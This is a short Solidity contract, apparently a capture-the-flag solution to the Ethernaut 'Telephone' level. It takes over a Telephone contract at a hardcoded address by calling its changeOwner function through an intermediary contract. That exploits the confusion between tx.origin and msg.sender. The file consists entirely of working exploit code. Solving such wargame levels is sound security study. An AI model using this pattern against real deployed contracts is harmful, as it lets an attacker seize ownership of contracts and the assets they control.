// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Telephone.sol';

contract TelephoneAttack {

  address public owner;
  Telephone tele = Telephone(address(0x97cE7044ee0Db4DF0dFDc801c2319158cf1bf55a));



  function changeOwner() public {
      tele.changeOwner(address(0xeB015B841913E996c47960fE32968BD9c4e83C7d));

  }
}